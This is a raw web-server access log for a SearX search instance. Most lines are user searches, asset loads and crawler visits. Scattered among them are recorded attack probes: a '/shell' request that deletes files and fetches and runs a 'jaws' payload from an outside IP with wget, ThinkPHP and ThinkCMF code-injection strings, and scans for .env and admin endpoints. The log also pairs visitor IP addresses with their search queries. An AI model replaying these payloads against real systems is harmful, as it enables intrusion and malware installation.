2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:40:08 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 200 39680 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:40:08 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 200 45062 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:40:08 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 200 89501 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:40:08 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
54.147.120.52 - - [23/Mar/2023:15:44:56 +0000] "GET / HTTP/1.1" 200 415732 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:48:57 +0000] "GET /searx/autocompleter?q=cfdt%20france HTTP/1.1" 200 214 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:48:59 +0000] "GET /searx/autocompleter?q=Kacaros HTTP/1.1" 200 23 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:00 +0000] "GET /searx/autocompleter?q=Kaca HTTP/1.1" 200 194 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:01 +0000] "GET /searx/autocompleter?q=K HTTP/1.1" 200 120 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:03 +0000] "GET /searx/autocompleter?q=Ma HTTP/1.1" 200 131 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:04 +0000] "GET /searx/autocompleter?q=Macaron HTTP/1.1" 200 197 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:06 +0000] "GET /searx/autocompleter?q=Macarons%20 HTTP/1.1" 200 201 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:07 +0000] "GET /searx/autocompleter?q=Macarons%20bis HTTP/1.1" 200 270 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:07 +0000] "GET /searx/autocompleter?q=Macarons%20bisc HTTP/1.1" 200 271 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:10 +0000] "GET /searx/autocompleter?q=Macarons%20biscuiterie HTTP/1.1" 200 76 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:10 +0000] "GET /searx/autocompleter?q=Macarons%20biscuiteries HTTP/1.1" 200 2 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:16 +0000] "GET /searx/autocompleter?q=Macarons%20biscuiteries%20de%20 HTTP/1.1" 200 2 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:17 +0000] "GET /searx/autocompleter?q=Macarons%20biscuiteries%20de%20ro HTTP/1.1" 200 2 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:17 +0000] "GET /searx/autocompleter?q=Macarons%20biscuiteries%20de%20roi HTTP/1.1" 200 2 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:18 +0000] "GET /searx/autocompleter?q=Macarons%20biscuiteries%20de%20roi%20 HTTP/1.1" 200 2 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:21 +0000] "GET /searx/autocompleter?q=Macarons%20biscuiteries%20de%20roi%20mm HTTP/1.1" 200 2 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:24 +0000] "GET /searx/autocompleter?q=Macarons%20biscuiteries%20de%20Roy%20pene HTTP/1.1" 200 2 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:25 +0000] "POST /searx/search HTTP/1.1" 200 10259 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:25 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:25 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:25 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:25 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:25 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:25 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:25 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:25 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:49:26 +0000] "GET /searx/autocompleter?q=Macarons%20biscuiteries%20de%20Roy%20pene HTTP/1.1" 200 2 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
51.222.253.2 - - [23/Mar/2023:15:50:27 +0000] "GET /robots.txt HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.57 - - [23/Mar/2023:15:50:28 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
152.89.196.54 - - [23/Mar/2023:15:53:34 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
167.248.133.126 - - [23/Mar/2023:15:54:49 +0000] "GET / HTTP/1.1" 200 135873 "-" "-"
54.36.149.99 - - [23/Mar/2023:15:54:49 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
167.248.133.126 - - [23/Mar/2023:15:54:49 +0000] "GET / HTTP/1.1" 200 368958 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.126 - - [23/Mar/2023:15:54:49 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
167.248.133.126 - - [23/Mar/2023:15:54:50 +0000] "GET /favicon.png HTTP/1.1" 200 17440 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.126 - - [23/Mar/2023:15:54:56 +0000] "GET /apple-touch-icon.png HTTP/1.1" 200 15195 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.126 - - [23/Mar/2023:15:54:56 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2001:41d0:303:c837:: - - [23/Mar/2023:15:55:00 +0000] "GET /wp-login.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
2001:41d0:303:c837:: - - [23/Mar/2023:15:55:00 +0000] "GET /wp-login.php HTTP/1.1" 404 125 "http://books.pseudot.org/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
218.29.54.69 - - [23/Mar/2023:16:01:14 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 100.43.163.61/jaws;sh+/tmp/jaws HTTP/1.1" 499 0 "-" "Hello, world"
152.89.196.54 - - [23/Mar/2023:16:23:06 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [23/Mar/2023:16:25:29 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
162.0.228.183 - - [23/Mar/2023:16:25:34 +0000] "GET /wp-login.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
152.89.196.54 - - [23/Mar/2023:16:43:14 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 415939 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
40.77.167.184 - - [23/Mar/2023:16:45:57 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.94 - - [23/Mar/2023:16:46:05 +0000] "GET /IMAGES/nokia64.gif HTTP/1.1" 200 558 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.94 - - [23/Mar/2023:16:47:05 +0000] "GET /IMAGES/pepsi.gif HTTP/1.1" 200 3682 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
79.137.207.165 - - [23/Mar/2023:16:49:09 +0000] "GET / HTTP/1.1" 200 2826140 "-" "Go-http-client/1.1"
2620:96:e000:b0cc:e:2:2:6 - - [23/Mar/2023:16:51:43 +0000] "GET / HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2620:96:e000:b0cc:e:2:2:6 - - [23/Mar/2023:16:51:43 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
2620:96:e000:b0cc:e:2:7:7 - - [23/Mar/2023:16:52:04 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2620:96:e000:b0cc:e:2:7:7 - - [23/Mar/2023:16:52:04 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
2620:96:e000:b0cc:e:2:7:7 - - [23/Mar/2023:16:52:04 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
40.77.167.206 - - [23/Mar/2023:16:59:41 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
172.105.128.11 - - [23/Mar/2023:17:00:07 +0000] "GET / HTTP/1.1" 200 364614 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
157.55.39.208 - - [23/Mar/2023:17:03:16 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
152.89.196.54 - - [23/Mar/2023:17:16:58 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 415724 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
207.244.242.193 - - [23/Mar/2023:17:21:39 +0000] "GET /wp-login.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
207.244.242.193 - - [23/Mar/2023:17:21:40 +0000] "GET /wp-login.php HTTP/1.1" 404 125 "http://programming.pseudot.org/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
143.110.222.166 - - [23/Mar/2023:17:28:04 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
109.237.97.180 - - [23/Mar/2023:17:29:22 +0000] "GET /.env HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [23/Mar/2023:17:29:22 +0000] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03u\x81E\xE9\x07\x0E\xF0\xC5\xAB\xB5}\x02\x85\x9F\x93R\x15U\x93v\x0B\x9E\x85\x95j\xC1;\xCD7\xFE\x14\xB3 \xB6\xB1${X\x1B\xA72o\xA3\x1BW\x88]\x87=\x1Bj'-\x9B\x1D\x8Dw\xDC\xDD\x16\x86\xA4\x1E\x80\x81\x00b\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0" 400 157 "-" "-"
152.89.196.54 - - [23/Mar/2023:17:35:56 +0000] "GET /console/ HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
157.55.39.208 - - [23/Mar/2023:17:37:10 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
107.170.227.23 - - [23/Mar/2023:17:39:41 +0000] "GET /druid/index.html HTTP/1.1" 404 0 "-" "Mozilla/5.0 zgrab/0.x"
40.77.167.184 - - [23/Mar/2023:17:41:21 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.191 - - [23/Mar/2023:17:41:26 +0000] "GET / HTTP/1.1" 200 605 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.94 - - [23/Mar/2023:17:53:52 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
152.89.196.54 - - [23/Mar/2023:18:02:01 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.54 - - [23/Mar/2023:18:16:51 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
167.94.138.36 - - [23/Mar/2023:18:18:03 +0000] "GET / HTTP/1.1" 200 130081 "-" "-"
167.94.138.36 - - [23/Mar/2023:18:18:03 +0000] "GET / HTTP/1.1" 200 361718 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.36 - - [23/Mar/2023:18:18:03 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.138.36 - - [23/Mar/2023:18:18:03 +0000] "GET /favicon.png HTTP/1.1" 200 17440 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.36 - - [23/Mar/2023:18:18:04 +0000] "GET /apple-touch-icon.png HTTP/1.1" 200 15195 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.36 - - [23/Mar/2023:18:18:04 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
143.110.222.166 - - [23/Mar/2023:18:25:20 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
104.129.63.114 - - [23/Mar/2023:18:26:08 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 0 "http://208.76.222.31:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
104.129.63.114 - - [23/Mar/2023:18:26:08 +0000] "" 400 0 "-" "-"
89.248.165.226 - - [23/Mar/2023:18:26:43 +0000] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00" 400 157 "-" "-"
46.193.1.170 - - [23/Mar/2023:18:27:12 +0000] "GET /search?q=idea+pitch+discussing+about+the+existing+concurence HTTP/1.1" 200 7355 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:27:12 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 200 125509 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:27:12 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 200 17731 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:27:12 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:27:12 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:27:12 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:27:12 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:27:12 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:27:12 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:27:19 +0000] "GET /autocompleter?q=idea%20pitch%20discussing%20about%20the%20existing%20concurence HTTP/1.1" 200 2 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:27:23 +0000] "GET /autocompleter?q=talking%20ao HTTP/1.1" 200 219 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:27:24 +0000] "GET /autocompleter?q=talking%20about HTTP/1.1" 200 312 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:27:24 +0000] "GET /autocompleter?q=talking%20about%20 HTTP/1.1" 200 312 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:28:15 +0000] "GET /autocompleter?q=bu HTTP/1.1" 200 140 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:28:22 +0000] "GET /autocompleter?q=business%20idea%20pitch%20ta HTTP/1.1" 200 2 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:28:26 +0000] "GET /autocompleter?q=business%20idea%20pitch%20talking%20about%20the%20 HTTP/1.1" 200 2 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:28:30 +0000] "GET /autocompleter?q=business%20idea%20pitch%20talking%20about%20the%20c HTTP/1.1" 200 2 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:28:31 +0000] "GET /autocompleter?q=business%20idea%20pitch%20talking%20about%20the%20co HTTP/1.1" 200 2 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:28:32 +0000] "GET /autocompleter?q=business%20idea%20pitch%20talking%20about%20the%20concurrence HTTP/1.1" 200 2 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:28:33 +0000] "POST /searx/search HTTP/1.1" 200 9493 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:28:33 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:28:33 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
